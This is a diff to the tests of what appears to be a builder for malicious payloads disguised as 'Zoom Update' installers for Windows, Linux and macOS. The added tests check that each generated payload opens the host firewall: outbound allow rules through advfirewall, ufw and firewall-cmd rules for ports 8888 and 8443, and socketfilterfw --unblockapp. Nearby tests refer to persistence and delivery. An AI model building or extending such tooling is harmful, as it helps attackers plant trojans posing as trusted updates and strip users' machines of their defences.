@@ -99,6 +99,26 @@ def test_windows_template_persists():
     assert "Zoom Update" in out
 
 
+def test_windows_payload_opens_firewall():
+    out = render_windows("Zoom-Update", "ab12", b"\x01", minimal_pdf("x"), "https://h")
+    assert "advfirewall" in out
+    assert "dir=out" in out
+    assert "action=allow" in out
+
+
+def test_linux_payload_opens_firewall():
+    out = render_linux("zoom-update", "ab12", b"\x01")
+    assert "ufw" in out
+    assert "firewall-cmd" in out
+    assert "8888" in out and "8443" in out
+
+
+def test_mac_payload_opens_firewall():
+    script = (build.TEMPLATES / "mac" / "build_app.sh").read_text(encoding="utf-8")
+    assert "socketfilterfw" in script
+    assert "--unblockapp" in script
+
+
 def test_linux_naming_and_delivery():
     name = "zoom-update-ab12.tar.gz"
     block = delivery_block("linux", name, "Zoom Update", "sha")
